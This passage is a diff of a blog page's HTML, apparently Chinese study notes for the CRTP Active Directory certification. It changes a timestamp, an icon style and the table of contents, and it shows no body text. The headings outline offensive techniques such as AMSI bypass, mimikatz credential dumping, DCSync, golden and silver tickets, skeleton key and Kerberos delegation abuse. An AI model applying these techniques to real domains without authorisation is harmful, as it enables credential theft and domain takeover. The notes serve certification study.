@@ -40,7 +40,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/wpimages/2025/crtp-study-note/background.jpg">
 <meta property="article:published_time" content="2024-12-20T11:40:41.000Z">
-<meta property="article:modified_time" content="2025-05-19T13:07:20.986Z">
+<meta property="article:modified_time" content="2025-05-20T20:07:10.805Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="AD">
 <meta property="article:tag" content="crtp">
@@ -289,35 +289,41 @@
     <div id="toc" class="widget-wrap">
       <button class="toc-toggle" onclick="toggleTOC()">
     <span class="toc-toggle-icon">
-        <i class="fa fa-chevron-down" aria-hidden="true"></i>
+        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
     </span>
 </button>
 <div id="tocContainer" style="display: block;">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-DACL"><span class="toc-number">1.</span> <span class="toc-text">01 DACL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%A4%9A%E4%B8%AA%E6%9D%83%E9%99%90%E5%9C%BA%E6%99%AF%E7%9A%84DACL%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.用户多个权限场景的DACL匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ACL%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.ACL权限利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85ACL"><span class="toc-number">1.3.</span> <span class="toc-text">3.枚举收集域内ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-AdminSDHolder"><span class="toc-number">1.4.</span> <span class="toc-text">4.AdminSDHolder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-%E5%88%A9%E7%94%A8AdminSD"><span class="toc-number">1.4.1.</span> <span class="toc-text">01.利用AdminSD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC%E6%89%8B%E5%8A%A8%E8%A7%A6%E5%8F%91adminSD%E5%90%8C%E6%AD%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">02.加载脚本手动触发adminSD同步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03-%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">03.如何防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E3%80%81%E6%B7%BB%E5%8A%A0%E7%AD%89%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A0%B7%E4%BE%8B%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">5.权限修改、添加等（命令样例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8EACL%E5%88%A9%E7%94%A8%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">6.基于ACL利用的访问持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">WMI的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E8%BF%9C%E7%A8%8B%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">Powershell远程的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.6.3.</span> <span class="toc-text">远程注册表权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-domain-enumeration"><span class="toc-number">2.</span> <span class="toc-text">02 domain enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84-description%EF%BC%88%E6%8F%8F%E8%BF%B0%EF%BC%89%E5%B1%9E%E6%80%A7%E8%A2%AB%E5%86%99%E4%BA%86%E6%98%8E%E6%96%87%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1.可能会有域用户的 description（描述）属性被写了明文敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E5%9F%9F%E5%86%85%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%99%BB%E5%BD%95%E6%AC%A1%E6%95%B0%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">2.2.</span> <span class="toc-text">2.找到域内实际使用的机器，可以通过登录次数来判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text">3.枚举组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sid%E6%98%AF%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%EF%BC%8C%E6%97%A0%E6%B3%95%E5%87%BA%E7%8E%B0%E4%BF%A9%E7%9B%B8%E5%90%8C%E7%9A%84"><span class="toc-number">2.4.</span> <span class="toc-text">sid是唯一标识，无法出现俩相同的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E5%9F%9F%E6%94%B6%E5%88%B0%E4%BA%86%E6%94%BB%E5%87%BB%EF%BC%8C%E6%95%B4%E4%B8%AA%E5%9F%9F%E6%9E%97%E6%97%A9%E6%99%9A%E9%83%BD%E4%BC%9AG%EF%BC%8C%EF%BC%88%E8%BF%99%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%B0%86%E4%BC%9A%E5%9C%A8-19-%E5%92%8C-20-%E8%8A%82%E8%AF%BE%E4%B8%AD%E5%AD%A6%E5%88%B0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E4%BA%BA%E5%91%98"><span class="toc-number">2.6.</span> <span class="toc-text">4.枚举域管理员组人员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">2.7.</span> <span class="toc-text">5.通过用户名枚举用户所属组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%9C%AC%E5%9C%B0-%E7%BB%84-%E6%88%96-%E7%BB%84%E6%88%90%E5%91%98"><span class="toc-number">2.8.</span> <span class="toc-text">6.列出本地 组 或 组成员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9E%9A%E4%B8%BE-smbshare"><span class="toc-number">2.9.</span> <span class="toc-text">7.枚举 smbshare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-bloodhound%E9%81%9B%E7%8B%97"><span class="toc-number">2.10.</span> <span class="toc-text">8.bloodhound遛狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SOAPHound"><span class="toc-number">2.11.</span> <span class="toc-text">9.SOAPHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%9F%9F%E4%BC%9A%E8%AF%9D%EF%BC%88session%EF%BC%89%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.12.</span> <span class="toc-text">10.域会话（session）枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%94%A8%E6%88%B7%E8%A2%AB%E9%85%8D%E7%BD%AE%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98-%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.13.</span> <span class="toc-text">11.用户被配置为本地管理员 枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-powershell"><span class="toc-number">3.</span> <span class="toc-text">03 powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-amsi"><span class="toc-number">3.1.</span> <span class="toc-text">bypass amsi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.</span> <span class="toc-text">加载模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%A8%A1%E5%9D%97%E4%B8%AD%E5%8F%AF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">列出模块中可用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.4.</span> <span class="toc-text">powershell 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.5.</span> <span class="toc-text">powershell 语言模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#applocker"><span class="toc-number">3.5.1.</span> <span class="toc-text">applocker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%8F%97%E9%99%90"><span class="toc-number">3.6.</span> <span class="toc-text">powershell执行脚本受限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OPSEC"><span class="toc-number">4.</span> <span class="toc-text">OPSEC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text">域票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.</span> <span class="toc-text">域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-GPO-OU"><span class="toc-number">5.</span> <span class="toc-text">04 GPO,OU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO"><span class="toc-number">5.1.</span> <span class="toc-text">GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OU"><span class="toc-number">5.2.</span> <span class="toc-text">OU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">受限组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO%E6%BB%A5%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">GPO滥用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-Domian-Trusts"><span class="toc-number">6.</span> <span class="toc-text">05 Domian Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.1.</span> <span class="toc-text">外部信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forest-Trusts"><span class="toc-number">6.2.</span> <span class="toc-text">Forest Trusts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%90%8D%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.3.</span> <span class="toc-text">枚举域名信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-Forest"><span class="toc-number">6.4.</span> <span class="toc-text">枚举 Forest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%9E%97%E4%B8%AD%E7%9A%84%E5%9F%9F"><span class="toc-number">6.5.</span> <span class="toc-text">获取指定域林中的域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9E%97%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%BC%96%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E6%9E%9A%E4%B8%BE%E4%BD%9C%E4%B8%BA%E5%85%A8%E5%B1%80%E7%9B%AE%E5%BD%95%E7%9A%84DC%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-number">6.6.</span> <span class="toc-text">列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E6%9E%97%E4%B9%8B%E9%97%B4%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.7.</span> <span class="toc-text">枚举域林之间信任</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">06 权限提升(Privilege Escalation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%BA%E9%99%B7%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.1.</span> <span class="toc-text">1.缺陷服务枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E9%AB%98%E6%9D%83%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.2.</span> <span class="toc-text">2.本身就易受攻击的高权服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NTLM-KRB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.</span> <span class="toc-text">3.NTLM&#x2F;KRB中继攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">07 横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E7%9B%B8%E5%85%B3%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="toc-number">9.</span> <span class="toc-text">08 相关敏感凭据提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">9.1.</span> <span class="toc-text">mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC%E4%B8%ADdump%E6%89%80%E6%9C%89%E5%9F%9F%E5%87%AD%E6%8D%AE"><span class="toc-number">9.1.1.</span> <span class="toc-text">DC中dump所有域凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dump%E5%87%AD%E6%8D%AE-dump-credentials"><span class="toc-number">9.1.2.</span> <span class="toc-text">dump凭据 dump credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-pth"><span class="toc-number">9.1.3.</span> <span class="toc-text">哈希传递(pth)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSync"><span class="toc-number">9.1.4.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PS%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95"><span class="toc-number">9.2.</span> <span class="toc-text">PS历史命令记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">9.2.1.</span> <span class="toc-text">票据利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-kerberos"><span class="toc-number">10.</span> <span class="toc-text">09 kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PAC"><span class="toc-number">10.1.</span> <span class="toc-text">1.PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Golden-Ticket"><span class="toc-number">10.2.</span> <span class="toc-text">2.Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%87%91%E7%A5%A8%EF%BC%9A"><span class="toc-number">10.2.1.</span> <span class="toc-text">利用金票：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-sliver-Ticket"><span class="toc-number">10.3.</span> <span class="toc-text">3.sliver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%93%B6%E7%A5%A8"><span class="toc-number">10.3.1.</span> <span class="toc-text">1.利用银票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Diamond-Ticket"><span class="toc-number">10.4.</span> <span class="toc-text">4.Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.4.1.</span> <span class="toc-text">1.利用钻石票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Skeleton-key"><span class="toc-number">10.5.</span> <span class="toc-text">5.Skeleton key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-number">10.5.1.</span> <span class="toc-text">1.注入万能钥匙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-DSRM"><span class="toc-number">10.6.</span> <span class="toc-text">6.DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96DSRM%E5%87%AD%E6%8D%AE"><span class="toc-number">10.6.1.</span> <span class="toc-text">1.获取DSRM凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8DSRM%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="toc-number">10.6.2.</span> <span class="toc-text">2.利用DSRM管理员账户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Custom-SSP"><span class="toc-number">10.7.</span> <span class="toc-text">7.Custom SSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">10.7.1.</span> <span class="toc-text">1.利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-kerberoasting"><span class="toc-number">10.8.</span> <span class="toc-text">8.kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SPN"><span class="toc-number">10.8.1.</span> <span class="toc-text">1.SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">10.8.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-AS-REProast"><span class="toc-number">10.8.2.</span> <span class="toc-text">2.AS-REProast</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">10.8.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Kerberos-Delegation-%EF%BC%88%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">10.9.</span> <span class="toc-text">9.Kerberos Delegation （委派）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-Delegation"><span class="toc-number">10.9.1.</span> <span class="toc-text">1.无约束委派 Unconstrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE"><span class="toc-number">10.9.1.1.</span> <span class="toc-text">1.枚举</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">10.9.1.2.</span> <span class="toc-text">2.利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Constrained-Delegation"><span class="toc-number">10.9.2.</span> <span class="toc-text">2.约束委派 Constrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2Self"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">S4U2Self</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U4Proxy"><span class="toc-number">10.9.2.2.</span> <span class="toc-text">S4U4Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%90%AF%E7%94%A8%E4%BA%86%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E6%9C%BA%E5%99%A8"><span class="toc-number">10.9.2.3.</span> <span class="toc-text">1.寻找启用了约束委派的用户或机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-S4U2Self-S4U2Proxy-%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.4.</span> <span class="toc-text">2.利用 S4U2Self + S4U2Proxy 访问服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8D%E7%A7%B0%E4%B8%8D%E5%8F%98-%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9S4U2proxy%E8%AF%B7%E6%B1%82%E5%9B%9E%E6%9D%A5%E7%9A%84%E7%A5%A8%E6%8D%AE%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.5.</span> <span class="toc-text">3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8-S4U2Self-%E4%BC%AA%E9%80%A0%E9%AB%98%E6%9D%83%E7%94%A8%E6%88%B7%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7ms-AllowedToDelegateTo%E5%B1%9E%E6%80%A7%E6%8C%87%E5%90%91%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%BA%E5%99%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.6.</span> <span class="toc-text">4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">10.9.3.</span> <span class="toc-text">3.基于资源的约束委派 RBCD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.9.3.1.</span> <span class="toc-text">1.利用点</span></a></li></ol></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-DACL"><span class="toc-number">1.</span> <span class="toc-text">01 DACL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%A4%9A%E4%B8%AA%E6%9D%83%E9%99%90%E5%9C%BA%E6%99%AF%E7%9A%84DACL%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.用户多个权限场景的DACL匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ACL%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.ACL权限利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85ACL"><span class="toc-number">1.3.</span> <span class="toc-text">3.枚举收集域内ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-AdminSDHolder"><span class="toc-number">1.4.</span> <span class="toc-text">4.AdminSDHolder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-%E5%88%A9%E7%94%A8AdminSD"><span class="toc-number">1.4.1.</span> <span class="toc-text">01.利用AdminSD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC%E6%89%8B%E5%8A%A8%E8%A7%A6%E5%8F%91adminSD%E5%90%8C%E6%AD%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">02.加载脚本手动触发adminSD同步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03-%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">03.如何防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E3%80%81%E6%B7%BB%E5%8A%A0%E7%AD%89%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A0%B7%E4%BE%8B%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">5.权限修改、添加等（命令样例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8EACL%E5%88%A9%E7%94%A8%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">6.基于ACL利用的访问持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">WMI的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E8%BF%9C%E7%A8%8B%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">Powershell远程的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.6.3.</span> <span class="toc-text">远程注册表权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-domain-enumeration"><span class="toc-number">2.</span> <span class="toc-text">02 domain enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84-description%EF%BC%88%E6%8F%8F%E8%BF%B0%EF%BC%89%E5%B1%9E%E6%80%A7%E8%A2%AB%E5%86%99%E4%BA%86%E6%98%8E%E6%96%87%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1.可能会有域用户的 description（描述）属性被写了明文敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E5%9F%9F%E5%86%85%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%99%BB%E5%BD%95%E6%AC%A1%E6%95%B0%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">2.2.</span> <span class="toc-text">2.找到域内实际使用的机器，可以通过登录次数来判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text">3.枚举组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 